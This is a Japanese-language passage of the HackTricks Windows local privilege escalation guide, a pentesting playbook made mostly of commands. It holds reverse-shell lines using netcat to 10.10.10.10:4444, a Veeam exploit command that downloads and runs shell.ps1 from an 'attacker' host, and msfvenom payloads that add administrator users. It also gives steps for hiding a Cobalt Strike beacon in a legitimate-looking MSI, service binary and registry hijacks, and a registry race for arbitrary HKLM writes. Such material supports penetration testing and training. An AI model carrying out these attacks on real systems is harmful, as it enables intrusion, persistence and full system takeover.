# Windows Local Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

### **Windows local privilege escalation vectors を探すための最適な tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

## Windows の基礎理論

### Access Tokens

**Windows Access Tokens について知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
access-tokens.md
{{#endref}}

### ACLs - DACLs/SACLs/ACEs

**ACLs - DACLs/SACLs/ACEs の詳細については、以下のページを確認してください:**


{{#ref}}
acls-dacls-sacls-aces.md
{{#endref}}

### Integrity Levels

**Windows の integrity levels について知らない場合は、続行する前に以下のページを読んでください:**


{{#ref}}
integrity-levels.md
{{#endref}}

## Windows Security Controls

Windows には、**system の enumeration を妨げたり**、実行ファイルの実行を妨げたり、さらには**活動を検知したり**する可能性のあるさまざまな要素があります。privilege escalation の enumeration を開始する前に、以下の**ページを読んで**、これらすべての**防御** **mechanisms**を**enumerate**してください:


{{#ref}}
../authentication-credentials-uac-and-efs/
{{#endref}}

### Admin Protection / UIAccess silent elevation

`RAiLaunchAdminProcess` を通じて起動された UIAccess processes は、AppInfo の secure-path checks が bypass された場合、prompt なしで High IL に到達するために abuse される可能性があります。専用の UIAccess/Admin Protection bypass workflow は、こちらを確認してください:

{{#ref}}
uiaccess-admin-protection-bypass.md
{{#endref}}

Secure Desktop accessibility registry propagation は、任意の SYSTEM registry write（RegPwn）に abuse される可能性があります:

{{#ref}}
secure-desktop-accessibility-registry-propagation-regpwn.md
{{#endref}}

最近の Windows builds では、特権を持つ local NTLM authentication が再利用された SMB TCP connection を介して reflect される、**SMB arbitrary-port** LPE path も導入されています:

{{#ref}}
local-ntlm-reflection-via-smb-arbitrary-port.md
{{#endref}}

## System Info

### Version info enumeration

Windows version に既知の vulnerability が存在するか確認してください（適用済みの patches も確認してください）。
```bash
systeminfo
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" #Get only that information
wmic qfe get Caption,Description,HotFixID,InstalledOn #Patches
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% #Get system architecture
```

```bash
[System.Environment]::OSVersion.Version #Current OS version
Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches
Get-Hotfix -description "Security update" #List only "Security Update" patches
```
### Version Exploits

この [site](https://msrc.microsoft.com/update-guide/vulnerability) は、Microsoft の security vulnerabilities に関する詳細情報を検索するのに便利です。この database には 4,700 件を超える security vulnerabilities が登録されており、Windows 環境が示す **massive attack surface** が分かります。

**システム上**

- _post/windows/gather/enum_patches_
- _post/multi/recon/local_exploit_suggester_
- [_watson_](https://github.com/rasta-mouse/Watson)
- [_winpeas_](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) _(Winpeas には watson が組み込まれています)_

**システム情報を使用してローカルで**

- [https://github.com/AonCyberLabs/Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [https://github.com/bitsadmin/wesng](https://github.com/bitsadmin/wesng)

**Exploits の GitHub repos:**

- [https://github.com/nomi-sec/PoC-in-GitHub](https://github.com/nomi-sec/PoC-in-GitHub)
- [https://github.com/abatchy17/WindowsExploits](https://github.com/abatchy17/WindowsExploits)
- [https://github.com/SecWiki/windows-kernel-exploits](https://github.com/SecWiki/windows-kernel-exploits)

### 環境

環境変数に credential/Juicy info が保存されていないか？
```bash
set
dir env:
Get-ChildItem Env: | ft Key,Value -AutoSize
```
### PowerShell 履歴
```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw
```
### PowerShell Transcript ファイル

[https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/](https://sid-500.com/2017/11/07/powershell-enabling-transcription-logging-by-using-group-policy/) で、これを有効にする方法を確認できます。
```bash
#Check is enable in the registry
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\Transcription
dir C:\Transcripts

#Start a Transcription session
Start-Transcript -Path "C:\transcripts\transcript0.txt" -NoClobber
Stop-Transcript
```
### PowerShell Module Logging

PowerShell pipeline の実行に関する詳細が記録されます。これには、実行されたコマンド、コマンドの呼び出し、スクリプトの一部が含まれます。ただし、完全な実行の詳細や出力結果は記録されない場合があります。

これを有効にするには、ドキュメントの「Transcript files」セクションの手順に従い、**「Powershell Transcription」**ではなく**「Module Logging」**を選択してください。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ModuleLogging
```
PowersShell ログの直近 15 件のイベントを表示するには、次を実行します：
```bash
Get-WinEvent -LogName "windows Powershell" | select -First 15 | Out-GridView
```
### PowerShell **Script Block Logging**

script の実行に関する完全なアクティビティと全コンテンツの記録が取得され、実行時にコードの各ブロックが確実に文書化されます。このプロセスにより、各アクティビティの包括的な監査証跡が保持され、forensics や malicious behavior の分析に役立ちます。実行時にすべてのアクティビティを記録することで、プロセスに関する詳細な洞察が提供されます。
```bash
reg query HKCU\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKCU\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
reg query HKLM\Wow6432Node\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging
```
Script Block のログイベントは、Windows Event Viewer の次のパスにあります: **Application and Services Logs > Microsoft > Windows > PowerShell > Operational**。\
最後の 20 件のイベントを表示するには、次を使用します:
```bash
Get-WinEvent -LogName "Microsoft-Windows-Powershell/Operational" | select -first 20 | Out-Gridview
```
### インターネット設定
```bash
reg query "HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
reg query "HKLM\Software\Microsoft\Windows\CurrentVersion\Internet Settings"
```
### ドライブ
```bash
wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```
## WSUS

更新が http ではなく http**S** を使用して要求されていない場合、システムを侵害できます。

まず、cmd で以下を実行して、ネットワークが非 SSL の WSUS update を使用しているか確認します。
```
reg query HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate /v WUServer
```
または、PowerShell では次のようにします。
```
Get-ItemProperty -Path HKLM:\Software\Policies\Microsoft\Windows\WindowsUpdate -Name "WUServer"
```
次のような返信を受け取った場合：
```bash
HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\WindowsUpdate
WUServer    REG_SZ    http://xxxx-updxx.corp.internal.com:8535
```

```bash
WUServer     : http://xxxx-updxx.corp.internal.com:8530
PSPath       : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows\windowsupdate
PSParentPath : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\software\policies\microsoft\windows
PSChildName  : windowsupdate
PSDrive      : HKLM
PSProvider   : Microsoft.PowerShell.Core\Registry
```
また、`HKLM\Software\Policies\Microsoft\Windows\WindowsUpdate\AU /v UseWUServer` または `Get-ItemProperty -Path hklm:\software\policies\microsoft\windows\windowsupdate\au -name "usewuserver"` が `1` と等しい場合。

**exploit可能です。** 最後のレジストリ値が `0` の場合、WSUSエントリは無視されます。

これらのvulnerabilityをexploitするには、[Wsuxploit](https://github.com/pimps/wsuxploit) や [pyWSUS ](https://github.com/GoSecure/pywsus) などのtoolを使用できます。これらは、non-SSL WSUS trafficに'fake' updateをinjectするためのMiTM weaponized exploit scriptです。

researchはこちらを参照してください。

{{#file}}
CTX_WSUSpect_White_Paper (1).pdf
{{#endfile}}

**WSUS CVE-2020-1013**

[**完全なreportはこちら**](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)。\
基本的に、これはこのbugがexploitするflawです。

> local user proxyをmodifyでき、Windows UpdatesがInternet Explorerのsettingsで設定されたproxyを使用する場合、[PyWSUS](https://github.com/GoSecure/pywsus)をlocalで実行して自分自身のtrafficをinterceptし、asset上でelevated userとしてcodeを実行できます。
>
> さらに、WSUS serviceはcurrent userのsettingsを使用するため、そのcertificate storeも使用します。WSUS hostname用のself-signed certificateをgenerateし、そのcertificateをcurrent userのcertificate storeに追加すれば、HTTPおよびHTTPSのWSUS trafficをinterceptできるようになります。WSUSは、certificateに対してtrust-on-first-use型のvalidationを実装するHSTS-likeなmechanismを使用していません。提示されたcertificateがuserからtrustedされ、正しいhostnameを持っていれば、serviceはそれをacceptedします。

このvulnerabilityは、tool [**WSUSpicious**](https://github.com/GoSecure/wsuspicious)（liberatedされた後）を使用してexploitできます。

## Third-Party Auto-Updaters and Agent IPC (local privesc)

多くのenterprise agentは、localhost IPC surfaceとprivileged update channelを公開しています。enrollmentをattacker serverへcoerceでき、updaterがrogue root CAまたはweak signer checksをtrustする場合、local userはmalicious MSIをdeliverでき、SYSTEM serviceにinstallさせることができます。一般化されたtechnique（Netskope stAgentSvc chain - CVE-2025-0309をベースにしたもの）はこちらを参照してください。


{{#ref}}
abusing-auto-updaters-and-ipc.md
{{#endref}}

## Veeam Backup & Replication CVE-2023-27532 (TCP 9401経由のSYSTEM)

Veeam B&R < `11.0.1.1261` は、**TCP/9401** 上でlocalhost serviceを公開しており、attacker-controlled messageをprocessすることで、**NT AUTHORITY\SYSTEM** としてarbitrary commandを実行できます。

- **Recon**: listenerとversionを確認します。例: `netstat -ano | findstr 9401` および `(Get-Item "C:\Program Files\Veeam\Backup and Replication\Backup\Veeam.Backup.Shell.exe").VersionInfo.FileVersion`。
- **Exploit**: required Veeam DLLsとともに`VeeamHax.exe`などのPoCを同じdirectoryに配置し、local socket経由でSYSTEM payloadをtriggerします。
```powershell
.\VeeamHax.exe --cmd "powershell -ep bypass -c \"iex(iwr http://attacker/shell.ps1 -usebasicparsing)\""
```
サービスはコマンドを SYSTEM として実行します。
## KrbRelayUp

特定の条件下にある Windows **ドメイン**環境には、**local privilege escalation**の脆弱性が存在します。これらの条件には、LDAP signing が強制されていない環境、ユーザーが **Resource-Based Constrained Delegation (RBCD)** を構成できる self-rights を持っていること、そしてユーザーがドメイン内にコンピューターを作成できることが含まれます。重要なのは、これらの**要件**が**デフォルト設定**で満たされる点です。

[**https://github.com/Dec0ne/KrbRelayUp**](https://github.com/Dec0ne/KrbRelayUp) で **exploit** を確認してください。

攻撃の流れについて詳しくは、[https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation/) を確認してください。

## AlwaysInstallElevated

この2つのレジストリが**有効**（値が **0x1**）になっている**場合**、あらゆる権限レベルのユーザーが `*.msi` ファイルを NT AUTHORITY\\**SYSTEM** として**インストール**（実行）できます。
```bash
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```
### Metasploit payloads
```bash
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi-nouac -o alwe.msi #No uac format
msfvenom -p windows/adduser USER=rottenadmin PASS=P@ssword123! -f msi -o alwe.msi #Using the msiexec the uac wont be prompted
```
meterpreter session がある場合は、**`exploit/windows/local/always_install_elevated`** モジュールを使用してこの technique を自動化できます。

### PowerUP

power-up の `Write-UserAddMSI` command を使用すると、privileges を escalate するための Windows MSI binary を current directory 内に作成できます。この script は、user/group の追加を求める precompiled MSI installer を書き出します（そのため、GIU access が必要です）。
```
Write-UserAddMSI
```
作成した binary を実行するだけで privileges を escalate できます。

### MSI Wrapper

この tools を使用して MSI wrapper を作成する方法については、この tutorial を読んでください。**command lines** を**実行**したいだけの場合は、"**.bat**" file を wrap できることに注意してください。


{{#ref}}
msi-wrapper.md
{{#endref}}

### WIX で MSI を作成


{{#ref}}
create-msi-with-wix.md
{{#endref}}

### Visual Studio で MSI を作成

- Cobalt Strike または Metasploit で、`C:\privesc\beacon.exe` に **new Windows EXE TCP payload** を **Generate** します。
- **Visual Studio** を開き、**Create a new project** を選択して、検索ボックスに "installer" と入力します。**Setup Wizard** project を選択し、**Next** をクリックします。
- project に **AlwaysPrivesc** などの名前を付け、location に **`C:\privesc`** を使用し、**place solution and project in the same directory** を選択して、**Create** をクリックします。
- step 3 of 4（含める files の選択）が表示されるまで **Next** をクリックし続けます。**Add** をクリックして、先ほど Generate した Beacon payload を選択します。次に **Finish** をクリックします。
- **Solution Explorer** で **AlwaysPrivesc** project を選択し、**Properties** で **TargetPlatform** を **x86** から **x64** に変更します。
- **Author** や **Manufacturer** など、installed app をより legitimate に見せるために変更できる properties もあります。
- project を右クリックし、**View > Custom Actions** を選択します。
- **Install** を右クリックし、**Add Custom Action** を選択します。
- **Application Folder** をダブルクリックし、**beacon.exe** file を選択して **OK** をクリックします。これにより、installer の実行直後に beacon payload が実行されます。
- **Custom Action Properties** で **Run64Bit** を **True** に変更します。
- 最後に、**build** します。
- `File 'beacon-tcp.exe' targeting 'x64' is not compatible with the project's target platform 'x86'` という warning が表示された場合は、platform が x64 に設定されていることを確認してください。

### MSI Installation

悪意のある `.msi` file の **installation** を **background** で実行するには：
```
msiexec /quiet /qn /i C:\Users\Steve.INFERNO\Downloads\alwe.msi
```
この脆弱性を悪用するには、次を使用できます: _exploit/windows/local/always_install_elevated_

## Antivirus と Detectors

### Audit Settings

これらの設定によって何が**記録される**かが決まるため、注意を払う必要があります。
```
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System\Audit
```
### WEF

Windows Event Forwardingは、ログがどこに送信されるかを知るうえで興味深いものです
```bash
reg query HKLM\Software\Policies\Microsoft\Windows\EventLog\EventForwarding\SubscriptionManager
```
### LAPS

**LAPS** は、**ローカル Administrator パスワードの管理**を目的として設計されており、ドメインに参加しているコンピューターごとに各パスワードが**一意でランダム化され、定期的に更新される**ことを保証します。これらのパスワードは Active Directory 内に安全に保存され、ACLs を通じて十分な権限を付与されたユーザーのみがアクセスできます。これにより、認証されたユーザーはローカル admin パスワードを確認できます。


{{#ref}}
../active-directory-methodology/laps.md
{{#endref}}

### WDigest

有効な場合、**平文パスワードは LSASS**（Local Security Authority Subsystem Service）に保存されます。\
[**このページにある WDigest の詳細情報**](../stealing-credentials/credentials-protections.md#wdigest)。
```bash
reg query 'HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest' /v UseLogonCredential
```
### LSA Protection

**Windows 8.1** 以降、Microsoft は Local Security Authority (LSA) に対する強化された保護を導入し、信頼されていないプロセスによる **メモリの読み取り** やコードのインジェクションの試みを **ブロック** して、システムのセキュリティをさらに強化しました。\
[**LSA Protection の詳細はこちら**](../stealing-credentials/credentials-protections.md#lsa-protection)。
```bash
reg query 'HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\LSA' /v RunAsPPL
```
### Credentials Guard

**Credential Guard** は **Windows 10** で導入されました。その目的は、pass-the-hash attacks などの脅威からデバイスに保存された credentials を保護することです。| [**Credentials Guard の詳細はこちら。**](../stealing-credentials/credentials-protections.md#credential-guard)
```bash
reg query 'HKLM\System\CurrentControlSet\Control\LSA' /v LsaCfgFlags
```
### Cached Credentials

**ドメイン資格情報**は**Local Security Authority**（LSA）によって認証され、オペレーティングシステムのコンポーネントによって利用されます。ユーザーのログオンデータが登録されたセキュリティパッケージによって認証されると、通常、そのユーザーのドメイン資格情報が確立されます。\
[**Cached Credentialsの詳細はこちら**](../stealing-credentials/credentials-protections.md#cached-credentials)。
```bash
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\MICROSOFT\WINDOWS NT\CURRENTVERSION\WINLOGON" /v CACHEDLOGONSCOUNT
```
## ユーザーとグループ

### ユーザーとグループの列挙

所属しているグループに興味深い権限があるかどうかを確認します
```bash
# CMD
net users %username% #Me
net users #All local users
net localgroup #Groups
net localgroup Administrators #Who is inside Administrators group
whoami /all #Check the privileges

# PS
Get-WmiObject -Class Win32_UserAccount
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
```
### 特権グループ

**特権グループに所属している場合、権限を昇格できる可能性があります**。特権グループと、それらを悪用して権限を昇格する方法については、こちらで確認してください:


{{#ref}}
../active-directory-methodology/privileged-groups-and-token-privileges.md
{{#endref}}

### Token manipulation

このページで**token**について**詳しく学べます**: [**Windows Tokens**](../authentication-credentials-uac-and-efs/index.html#access-tokens)。\
**興味深いtoken**と、それらを悪用する方法については、次のページを確認してください:


{{#ref}}
privilege-escalation-abusing-tokens.md
{{#endref}}

### ログイン中のユーザー / セッション
```bash
qwinsta
klist sessions
```
### Home フォルダー
```bash
dir C:\Users
Get-ChildItem C:\Users
```
### パスワードポリシー
```bash
net accounts
```
### クリップボードの内容を取得する
```bash
powershell -command "Get-Clipboard"
```
## 実行中のプロセス

### ファイルとフォルダーの権限

まず、プロセスを一覧表示する際は、**プロセスのコマンドライン内にパスワードがないか確認してください**。\
**実行中のバイナリを上書きできるか**、またはバイナリのフォルダーに対する書き込み権限があり、想定される [**DLL Hijacking attacks**](dll-hijacking/index.html) を悪用できないか確認してください：
```bash
Tasklist /SVC #List processes running and services
tasklist /v /fi "username eq system" #Filter "system" processes

#With allowed Usernames
Get-WmiObject -Query "Select * from Win32_Process" | where {$_.Name -notlike "svchost*"} | Select Name, Handle, @{Label="Owner";Expression={$_.GetOwner().User}} | ft -AutoSize

#Without usernames
Get-Process | where {$_.ProcessName -notlike "svchost*"} | ft ProcessName, Id
```
常に実行中の [**electron/cef/chromium debuggers** がないか確認してください。これを悪用して privileges を escalate できる可能性があります](../../linux-hardening/software-information/electron-cef-chromium-debugger-abuse.md)。

**プロセスのバイナリに対する permissions の確認**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v "system32"^|find ":"') do (
for /f eol^=^"^ delims^=^" %%z in ('echo %%x') do (
icacls "%%z"
2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo.
)
)
```
**プロセスのバイナリが存在するフォルダの権限を確認（**[**DLL Hijacking**](dll-hijacking/index.html)**）**
```bash
for /f "tokens=2 delims='='" %%x in ('wmic process list full^|find /i "executablepath"^|find /i /v
"system32"^|find ":"') do for /f eol^=^"^ delims^=^" %%y in ('echo %%x') do (
icacls "%%~dpy\" 2>nul | findstr /i "(F) (M) (W) :\\" | findstr /i ":\\ everyone authenticated users
todos %username%" && echo.
)
```
### メモリからのパスワードマイニング

sysinternals の **procdump** を使用して、実行中のプロセスのメモリダンプを作成できます。FTP などのサービスは、**メモリ内に認証情報が平文で保存されている**ため、メモリをダンプして認証情報を読み取ってみてください。
```bash
procdump.exe -accepteula -ma <proc_name_tasklist>
```
### Insecure GUI apps

**SYSTEM として実行されている Applications では、ユーザーが CMD を起動したり、ディレクトリを参照したりできる場合があります。**

例: 「Windows Help and Support」（Windows + F1）で「command prompt」を検索し、「Click to open Command Prompt」をクリックします。

## Services

Service Triggers により、特定の条件（named pipe/RPC endpoint のアクティビティ、ETW events、IP の availability、device arrival、GPO refresh など）が発生したときに Windows が service を起動できます。SERVICE_START rights がなくても、trigger を発生させることで privileged services を起動できる場合があります。enumeration および activation techniques については、こちらを参照してください。

-
{{#ref}}
service-triggers.md
{{#endref}}

Services のリストを取得します:
```bash
net start
wmic service list brief
sc query
Get-Service
```
### 権限

**sc** を使用してサービスの情報を取得できます
```bash
sc qc <service_name>
```
各サービスに必要な権限レベルを確認するため、_Sysinternals_ の **accesschk** バイナリを用意しておくことを推奨します。
```bash
accesschk.exe -ucqv <Service_Name> #Check rights for different groups
```
「Authenticated Users」がサービスを変更できるか確認することを推奨します：
```bash
accesschk.exe -uwcqv "Authenticated Users" * /accepteula
accesschk.exe -uwcqv %USERNAME% * /accepteula
accesschk.exe -uwcqv "BUILTIN\Users" * /accepteula 2>nul
accesschk.exe -uwcqv "Todos" * /accepteula ::Spanish version
```
[XP 用の accesschk.exe はこちらから download できます](https://github.com/ankh2054/windows-pentest/raw/master/Privelege/accesschk-2003-xp.exe)

### service を有効化

（例：SSDPSRV で）次のエラーが発生した場合：

_System error 1058 has occurred._\
_The service cannot be started, either because it is disabled or because it has no enabled devices associated with it._

次の方法で有効化できます
```bash
sc config SSDPSRV start= demand
sc config SSDPSRV obj= ".\LocalSystem" password= ""
```
**サービス upnphost が動作するには SSDPSRV に依存している点に注意してください（XP SP1 の場合）**

この問題に対する**別の回避策**は、次を実行することです：
```
sc.exe config usosvc start= auto
```
### **サービスバイナリパスの変更**

「Authenticated users」グループがサービスに対する **SERVICE_ALL_ACCESS** を持っている場合、サービスの実行可能バイナリを変更できます。**sc** を変更して実行するには:
```bash
sc config <Service_Name> binpath= "C:\nc.exe -nv 127.0.0.1 9988 -e C:\WINDOWS\System32\cmd.exe"
sc config <Service_Name> binpath= "net localgroup administrators username /add"
sc config <Service_Name> binpath= "cmd \c C:\Users\nc.exe 10.10.10.10 4444 -e cmd.exe"

sc config SSDPSRV binpath= "C:\Documents and Settings\PEPE\meter443.exe"
```
### サービスを再起動する
```bash
wmic service NAMEOFSERVICE call startservice
net stop [service name] && net start [service name]
```
権限は、さまざまな権限を通じて昇格できます。

- **SERVICE_CHANGE_CONFIG**: service binary の再構成を許可します。
- **WRITE_DAC**: 権限の再構成を可能にし、service configurations を変更できるようにします。
- **WRITE_OWNER**: 所有権の取得と権限の再構成を許可します。
- **GENERIC_WRITE**: service configurations を変更する権限を継承します。
- **GENERIC_ALL**: service configurations を変更する権限も継承します。

この脆弱性の検出と exploit には、_exploit/windows/local/service_permissions_ を利用できます。

### Services binaries weak permissions

service が **`LocalSystem`**、**`LocalService`**、**`NetworkService`**、または特権を持つ domain account として実行されているものの、**low-privileged users が service EXE またはその親フォルダを変更できる場合**、**binary を置き換えて service を再起動する**ことで、service を hijack できることがあります。

**service によって実行される binary を変更できるか**、または binary が存在する**フォルダに対する write permissions があるか**を確認してください（[**DLL Hijacking**](dll-hijacking/index.html)**.**）\
**wmic**（system32 にはありません）を使用して service によって実行されるすべての binary を取得し、**icacls** を使用して権限を確認できます：
```bash
for /f "tokens=2 delims='='" %a in ('wmic service list full^|find /i "pathname"^|find /i /v "system32"') do @echo %a >> %temp%\perm.txt

for /f eol^=^"^ delims^=^" %a in (%temp%\perm.txt) do cmd.exe /c icacls "%a" 2>nul | findstr "(M) (F) :\"
```
また、**sc** と **icacls** も使用できます：
```bash
sc qc <service_name>
icacls "C:\path\to\service.exe"

sc query state= all | findstr "SERVICE_NAME:" >> C:\Temp\Servicenames.txt
FOR /F "tokens=2 delims= " %i in (C:\Temp\Servicenames.txt) DO @echo %i >> C:\Temp\services.txt
FOR /F %i in (C:\Temp\services.txt) DO @sc qc %i | findstr "BINARY_PATH_NAME" >> C:\Temp\path.txt
```
**`Everyone`**、**`BUILTIN\Users`**、または **`Authenticated Users`** に付与された危険な ACL を探します。特に、サービス実行ファイルまたはそれを含むディレクトリに対する **`(F)`**、**`(M)`**、**`(W)`** に注意してください。実用的な abuse flow は次のとおりです。

1. `sc qc <service_name>` でサービスアカウントと実行ファイルのパスを確認します。
2. `icacls <path>` でバイナリが書き込み可能か確認します。
3. サービスバイナリを payload または有効な malicious service binary に置き換えます。
4. `sc stop <service_name> && sc start <service_name>` でサービスを再起動します（または再起動 / service trigger を待ちます）。

Useful automated checks:
```powershell
. .\PowerUp.ps1
Get-ModifiableServiceFile -Verbose

SharpUp.exe audit ModifiableServiceBinaries
. .\PrivescCheck.ps1
Invoke-PrivescCheck -Extended -Audit
```
> サービスによって通常ユーザーによる再起動が許可されていない場合は、起動時に自動的に開始されるか、サービスを再起動する failure action が設定されているか、またはそのサービスを使用するアプリケーションによって間接的に起動できるかを確認してください。

### Services registry modify permissions

サービス registry を変更できるか確認してください。\
次の方法で、サービス **registry** に対する **permissions** を **check** できます。
```bash
reg query hklm\System\CurrentControlSet\Services /s /v imagepath #Get the binary paths of the services

#Try to write every service with its current content (to check if you have write permissions)
for /f %a in ('reg query hklm\system\currentcontrolset\services') do del %temp%\reg.hiv 2>nul & reg save %a %temp%\reg.hiv 2>nul && reg restore %a %temp%\reg.hiv 2>nul && echo You can modify %a

get-acl HKLM:\System\CurrentControlSet\services\* | Format-List * | findstr /i "<Username> Users Path Everyone"
```
**Authenticated Users** または **NT AUTHORITY\INTERACTIVE** が `FullControl` 権限を持っているか確認する必要があります。持っている場合、service によって実行されるバイナリを変更できます。

実行されるバイナリの Path を変更するには：
```bash
reg add HKLM\SYSTEM\CurrentControlSet\services\<service_name> /v ImagePath /t REG_EXPAND_SZ /d C:\path\new\binary /f
```
### 任意の HKLM value write を実現する Registry symlink race（ATConfig）

一部の Windows Accessibility 機能は、ユーザーごとの **ATConfig** キーを作成します。これらのキーは後で **SYSTEM** プロセスによって HKLM のセッションキーへコピーされます。Registry **symbolic link race** により、この特権 write を **任意の HKLM パス**へリダイレクトでき、任意の HKLM **value write** primitive が得られます。

主な場所（例: On-Screen Keyboard `osk`）:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATs` には、インストール済みの Accessibility 機能が一覧表示されます。
- `HKCU\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\ATConfig\<feature>` には、ユーザーが制御できる設定が保存されます。
- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Accessibility\Session<session id>\ATConfig\<feature>` は、logon/secure-desktop transitions 中に作成され、ユーザーによる write が可能です。

Abuse flow（CVE-2026-24291 / ATConfig）:

1. SYSTEM に write させたい **HKCU ATConfig** value を設定します。
2. secure-desktop copy を trigger します（例: **LockWorkstation**）。これにより AT broker flow が開始されます。
3. `C:\Program Files\Common Files\microsoft shared\ink\fsdefinitions\oskmenu.xml` に **oplock** を設定して **race に勝ちます**。oplock が発生したら、**HKLM Session ATConfig** key を、保護された HKLM target への **registry link** に置き換えます。
4. SYSTEM が、redirect された HKLM path に attacker が選択した value を write します。

任意の HKLM value write を取得したら、service configuration values を overwrite して LPE に pivot します。

- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\ImagePath`（EXE/command line）
- `HKLM\SYSTEM\CurrentControlSet\Services\<svc>\Parameters\ServiceDll`（DLL）

通常のユーザーが start できる service（例: **`msiserver`**）を選択し、write 後に trigger します。**注:** public exploit implementation は race の一環として workstation を **lock** します。

Example tooling（RegPwn BOF / standalone）:
```bash
beacon> regpwn C:\payload.exe SYSTEM\CurrentControlSet\Services\msiserver ImagePath
beacon> regpwn C:\evil.dll SYSTEM\CurrentControlSet\Services\SomeService\Parameters ServiceDll
net start msiserver
```
### Services registry AppendData/AddSubdirectory permissions

レジストリに対してこの権限を持っている場合、**このレジストリからサブレジストリを作成できる**ことを意味します。Windows servicesの場合、これは**任意のコードを実行するのに十分です**:


{{#ref}}
appenddata-addsubdirectory-permission-over-service-registry.md
{{#endref}}

### Unquoted Service Paths

実行可能ファイルへのパスが引用符で囲まれていない場合、Windowsはスペースで区切られるたびに、そこまでのパスを実行しようとします。

例えば、パスが _C:\Program Files\Some Folder\Service.exe_ の場合、Windowsは以下のファイルを実行しようとします:
```bash
C:\Program.exe
C:\Program Files\Some.exe
C:\Program Files\Some Folder\Service.exe
```
組み込み Windows サービスに属するものを除外した、引用符で囲まれていないすべてのサービス パス:
```bash
wmic service get name,pathname,displayname,startmode | findstr /i auto | findstr /i /v "C:\Windows" | findstr /i /v '\"'
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows\system32" | findstr /i /v '\"'  # Not only auto services

# Using PowerUp.ps1
Get-ServiceUnquoted -Verbose
```

```bash
for /f "tokens=2" %%n in ('sc query state^= all^| findstr SERVICE_NAME') do (
for /f "delims=: tokens=1*" %%r in ('sc qc "%%~n" ^| findstr BINARY_PATH_NAME ^| findstr /i /v /l /c:"c:\windows\system32" ^| findstr /v /c:"\""') do (
echo %%~s | findstr /r /c:"[a-Z][ ][a-Z]" >nul 2>&1 && (echo %%n && echo %%~s && icacls %%s | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%") && echo.
)
)
```

```bash
gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode | Where {$_.StartMode -eq "Auto" -and $_.PathName -notlike "C:\Windows*" -and $_.PathName -notlike '"*'} | select PathName,DisplayName,Name
```
**この脆弱性は** metasploit を使用して検出および exploit **できます**: `exploit/windows/local/trusted\_service\_path` metasploit を使用して service binary を手動で作成できます:
```bash
msfvenom -p windows/exec CMD="net localgroup administrators username /add" -f exe-service -o service.exe
```
### 回復アクション

